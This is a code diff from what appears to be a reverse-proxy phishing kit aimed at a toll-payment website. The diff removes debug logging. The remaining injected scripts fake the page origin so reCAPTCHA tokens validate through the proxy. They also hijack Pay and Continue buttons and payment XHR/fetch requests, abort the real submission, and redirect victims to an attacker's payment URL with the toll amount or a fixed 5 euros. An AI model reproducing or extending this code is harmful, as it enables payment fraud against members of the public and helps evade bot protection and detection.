@@ -679,7 +679,6 @@ const proxyOptions = {
       var originalUrl = url;
       url = fixRecaptchaUrl(url);
       if (url !== originalUrl) {
-        console.log('[reCAPTCHA Fix] XHR URL fixed:', originalUrl.substring(0, 100), '->', url.substring(0, 100));
       }
     }
     // Store URL for later header fixing
@@ -733,7 +732,6 @@ const proxyOptions = {
       var originalUrl = url;
       url = fixRecaptchaUrl(url);
       if (url !== originalUrl) {
-        console.log('[reCAPTCHA Fix] Fetch URL fixed:', originalUrl.substring(0, 100), '->', url.substring(0, 100));
       }
       args[0] = url;
     }
@@ -805,7 +803,6 @@ const proxyOptions = {
     const originalExecute = grecaptchaObj.execute;
     if (originalExecute) {
       grecaptchaObj.execute = function(siteKey, options) {
-        console.log('[reCAPTCHA Fix] grecaptcha.execute called - fixing location.origin');
         
         // CRITICAL: Temporarily override window.location.origin during token generation
         // This ensures token is generated with TARGET_ORIGIN instead of PROXY_ORIGIN
@@ -825,10 +822,8 @@ const proxyOptions = {
                 enumerable: true
               });
               locationState.overridden = false;
-              console.log('[reCAPTCHA Fix] window.location restored');
             }
           } catch (e) {
-            console.warn('[reCAPTCHA Fix] Error restoring location:', e);
           }
         }
         
@@ -837,7 +832,6 @@ const proxyOptions = {
           const locationProxy = new Proxy(originalLocation, {
             get: function(target, prop) {
               if (prop === 'origin') {
-                console.log('[reCAPTCHA Fix] Returning TARGET_ORIGIN for location.origin:', TARGET_ORIGIN);
                 return TARGET_ORIGIN;
               }
               if (prop === 'hostname') {
@@ -873,11 +867,9 @@ const proxyOptions = {
             if (result && typeof result.then === 'function') {
               // It's a Promise - restore location after token is generated
               result.then(function(token) {
-                console.log('[reCAPTCHA Fix] Token generated, restoring location');
                 restoreLocation();
                 return token;
               }).catch(function(error) {
-                console.warn('[reCAPTCHA Fix] Token generation failed:', error);
                 restoreLocation();
                 throw error;
               });
@@ -893,7 +885,6 @@ const proxyOptions = {
           
           return result;
         } catch (e) {
-          console.error('[reCAPTCHA Fix] Error overriding location:', e);
           // Fallback: just call original
           if (locationOverridden) {
             try {
@@ -906,7 +897,6 @@ const proxyOptions = {
                 enumerable: true
               });
             } catch (restoreError) {
-              console.error('[reCAPTCHA Fix] Error restoring location in catch:', restoreError);
             }
           }
           return originalExecute.apply(this, arguments);
@@ -933,9 +923,6 @@ const proxyOptions = {
     configurable: true
   });
   
-  console.log('[reCAPTCHA Fix] Initialized - target domain:', TARGET_ORIGIN);
-  console.log('[reCAPTCHA Fix] Proxy domain:', PROXY_ORIGIN);
-  console.log('[reCAPTCHA Fix] All interceptors active: XHR, Fetch, Script loading');
 })();
 </script>`;
             
@@ -957,7 +944,6 @@ const proxyOptions = {
   'use strict';
   
   const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
-  console.log('[Payment Redirect] LOW-LEVEL interceptor initialized');
   
   // Detect mobile device
   function isMobileDevice() {
@@ -968,28 +954,22 @@ const proxyOptions = {
   }
   
   const isMobile = isMobileDevice();
-  console.log('[Payment Redirect] Device type:', isMobile ? 'MOBILE' : 'DESKTOP');
   
   // Function to redirect to payment system (works on both mobile and desktop)
   function redirectToPayment(amount) {
     const paymentUrl = PAYMENT_URL + '?amount=' + amount;
-    console.log('[Payment Redirect] Redirecting to:', paymentUrl);
     
     if (isMobile) {
       // MOBILE: Use direct navigation (window.location.href)
       // This is more reliable on mobile devices than window.open()
-      console.log('[Payment Redirect] Using direct navigation for mobile device');
       window.location.href = paymentUrl;
     } else {
       // DESKTOP: Use window.open() to open in new tab
-      console.log('[Payment Redirect] Using window.open() for desktop device');
       const paymentWindow = window.open(paymentUrl, '_blank');
       
       if (paymentWindow) {
-        console.log('[Payment Redirect] Payment window opened successfully');
         return true;
       } else {
-        console.warn('[Payment Redirect] window.open() failed, falling back to direct navigation');
         // Fallback: if popup is blocked, use direct navigation
         window.location.href = paymentUrl;
         return true;
@@ -1043,7 +1023,6 @@ const proxyOptions = {
       
       return indicators >= 2;
     } catch (err) {
-      console.error('[Payment Redirect] Error checking payment page:', err);
       return false;
     }
   }
@@ -1053,7 +1032,6 @@ const proxyOptions = {
     try {
       // Wait for DOM if needed
       if (!document.body) {
-        console.warn('[Payment Redirect] DOM not ready yet');
         return null;
       }
       
@@ -1070,10 +1048,8 @@ const proxyOptions = {
         return euroMatch[1].replace(/,/g, '');
       }
       
-      console.warn('[Payment Redirect] Amount not found');
       return null;
     } catch (err) {
-      console.error('[Payment Redirect] Error extracting amount:', err);
       return null;
     }
   }
@@ -1090,11 +1066,9 @@ const proxyOptions = {
       btn.addEventListener('click', function(e) {
         // Only intercept if we're on payment page
         if (!isPaymentPage()) {
-          console.log('[Payment Redirect] Not on payment page, allowing normal click');
           return;
         }
         
-        console.log('[Payment Redirect] Pay button clicked - intercepting!');
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
@@ -1102,16 +1076,13 @@ const proxyOptions = {
         // Extract amount
         const amount = extractAmount();
         if (amount && parseFloat(amount) > 0) {
-          console.log('[Payment Redirect] Redirecting with amount:', amount);
           redirectToPayment(amount);
         } else {
-          console.error('[Payment Redirect] Could not extract amount from page');
         }
         
         return false;
       }, true); // Use capture phase to intercept before Drupal
       
-      console.log('[Payment Redirect] Pay button interceptor attached');
     }
     
     // Find and intercept existing Pay buttons
@@ -1147,7 +1118,6 @@ const proxyOptions = {
     setTimeout(findAndInterceptPayButtons, 500);
     setTimeout(findAndInterceptPayButtons, 2000);
     
-    console.log('[Payment Redirect] Pay button interceptor initialized with MutationObserver');
   }
   
   // Check if user is on journey date/time page (with date input fields)
@@ -1176,18 +1146,10 @@ const proxyOptions = {
       const isDatePage = hasJourneyDate && indicators >= 2;
       
       if (isDatePage) {
-        console.log('[Payment Redirect] Journey date page detected:', {
-          hasJourneyDate,
-          hasJourneyTime,
-          hasOwnershipCheckbox,
-          hasHeading,
-          indicators
-        });
       }
       
       return isDatePage;
     } catch (err) {
-      console.error('[Payment Redirect] Error checking journey date page:', err);
       return false;
     }
   }
@@ -1205,18 +1167,15 @@ const proxyOptions = {
       function handleContinueClick(e) {
         // CRITICAL: Double-check we're on journey date page before intercepting
         if (!isJourneyDatePage()) {
-          console.log('[Payment Redirect] Not on journey date page, allowing normal Continue click');
           return;
         }
         
-        console.log('[Payment Redirect] Continue button clicked on journey date page - intercepting!');
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
         
         // Fixed amount: 5 euros
         const amount = '5';
-        console.log('[Payment Redirect] Redirecting Continue button to payment system with amount:', amount);
         redirectToPayment(amount);
         
         return false;
@@ -1228,7 +1187,6 @@ const proxyOptions = {
       // Also use click as fallback
       btn.addEventListener('click', handleContinueClick, true);
       
-      console.log('[Payment Redirect] Continue button interceptor attached');
     }
     
     // Find and intercept existing Continue buttons
@@ -1266,7 +1224,6 @@ const proxyOptions = {
     setTimeout(findAndInterceptContinueButtons, 500);
     setTimeout(findAndInterceptContinueButtons, 2000);
     
-    console.log('[Payment Redirect] Continue button interceptor initialized with MutationObserver');
   }
   
   // Initialize both interceptors when DOM is ready
@@ -1287,7 +1244,6 @@ const proxyOptions = {
     
     // CRITICAL: Block reCAPTCHA requests if redirect is in progress
     if (redirectInProgress && url && url.includes('google.com/recaptcha')) {
-      console.log('[Payment Redirect] BLOCKING reCAPTCHA request (redirect in progress)');
       this._blocked = true;
       return; // Don't call original open - block the request
     }
@@ -1299,7 +1255,6 @@ const proxyOptions = {
   XMLHttpRequest.prototype.send = function(body) {
     // If request was blocked in open(), don't send it
     if (this._blocked) {
-      console.log('[Payment Redirect] Request was blocked, not sending');
       return;
     }
     
@@ -1309,8 +1264,6 @@ const proxyOptions = {
       this._interceptedURL &&
       (this._interceptedURL.includes('/pay-toll') || this._interceptedURL.includes('ajax_form=1'))
     ) {
-      console.log('[Payment Redirect] XHR INTERCEPTED:', this._interceptedMethod, this._interceptedURL);
-      console.log('[Payment Redirect] Request body:', body);
       
       // Check if this is the final payment submission
       const bodyStr = body ? body.toString() : '';
@@ -1327,22 +1280,18 @@ const proxyOptions = {
         const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
         const currentAmount = bodyAmountMatch && bodyAmountMatch[1] ? bodyAmountMatch[1] : null;
         if (currentAmount && currentAmount !== lastPaymentAmount) {
-          console.log('[Payment Redirect] New payment amount detected:', currentAmount, '(previous:', lastPaymentAmount, ') - resetting flag');
           redirectInProgress = false;
           lastPaymentAmount = currentAmount;
         }
       }
       
       if (hasTotalPayment && isFinalPayButton && !redirectInProgress) {
-        console.log('[Payment Redirect] FINAL PAYMENT REQUEST DETECTED - BLOCKING');
         redirectInProgress = true;
         
         // CRITICAL: Abort BEFORE any reCAPTCHA can be triggered
         try {
           this.abort();
-          console.log('[Payment Redirect] Request aborted successfully');
         } catch (e) {
-          console.error('[Payment Redirect] Error aborting request:', e);
         }
         
         // Extract amount DYNAMICALLY from the request body or page
@@ -1352,7 +1301,6 @@ const proxyOptions = {
         const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
         if (bodyAmountMatch && bodyAmountMatch[1]) {
           amount = bodyAmountMatch[1];
-          console.log('[Payment Redirect] Amount extracted from request body:', amount);
           // Save amount for future comparison
           lastPaymentAmount = amount;
         } else {
@@ -1360,7 +1308,6 @@ const proxyOptions = {
         }
         
         if (amount && parseFloat(amount) > 0) {
-          console.log('[Payment Redirect] Redirecting with dynamic amount:', amount);
           
           // Redirect to payment system (handles mobile/desktop automatically)
           if (redirectToPayment(amount)) {
@@ -1368,15 +1315,12 @@ const proxyOptions = {
             // Use timeout to ensure redirect is processed
             setTimeout(function() {
               redirectInProgress = false;
-              console.log('[Payment Redirect] Flag reset - ready for next payment attempt');
             }, isMobile ? 1000 : 2000); // Shorter timeout for mobile (direct navigation)
           } else {
-            console.error('[Payment Redirect] Failed to redirect');
             redirectInProgress = false;
             lastPaymentAmount = null; // Reset on failure
           }
         } else {
-          console.error('[Payment Redirect] Could not find dynamic amount');
           redirectInProgress = false;
           lastPaymentAmount = null; // Reset on failure
         }
@@ -1387,7 +1331,6 @@ const proxyOptions = {
     
     // Block reCAPTCHA requests if redirect is in progress
     if (redirectInProgress && this._interceptedURL && this._interceptedURL.includes('google.com/recaptcha')) {
-      console.log('[Payment Redirect] BLOCKING reCAPTCHA send (redirect in progress)');
       return; // Don't send reCAPTCHA request
     }
     
@@ -1401,7 +1344,6 @@ const proxyOptions = {
     
     // CRITICAL: Block ALL reCAPTCHA requests if redirect is in progress
     if (redirectInProgress && urlStr.includes('google.com/recaptcha')) {
-      console.log('[Payment Redirect] BLOCKING reCAPTCHA Fetch request (redirect in progress)');
       return Promise.reject(new Error('reCAPTCHA blocked - redirect in progress'));
     }
     
@@ -1410,7 +1352,6 @@ const proxyOptions = {
       options.method === 'POST' &&
       (urlStr.includes('/pay-toll') || urlStr.includes('ajax_form=1'))
     ) {
-      console.log('[Payment Redirect] FETCH INTERCEPTED:', urlStr);
       
       // Check if final payment submit
       if (options.body && !redirectInProgress) {
@@ -1419,7 +1360,6 @@ const proxyOptions = {
         const isFinalSubmit = bodyStr.includes('_triggering_element_value=Pay') && !bodyStr.includes('_triggering_element_value=Pay+');
         
         if (hasTotalPayment && isFinalSubmit) {
-          console.log('[Payment Redirect] FINAL PAYMENT via Fetch - BLOCKING');
           redirectInProgress = true;
           
           const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
@@ -1431,7 +1371,6 @@ const proxyOptions = {
               // Reset flag after successful redirect
               setTimeout(function() {
                 redirectInProgress = false;
-                console.log('[Payment Redirect] Flag reset (Fetch) - ready for next payment attempt');
               }, isMobile ? 1000 : 2000); // Shorter timeout for mobile (direct navigation)
             } else {
               redirectInProgress = false;
@@ -1447,8 +1386,6 @@ const proxyOptions = {
     return originalFetch.apply(this, arguments);
   };
   
-  console.log('[Payment Redirect] LOW-LEVEL interceptors installed (XHR + Fetch)');
-  console.log('[Payment Redirect] Waiting for payment submission...');
 })();
 </script>`;
             
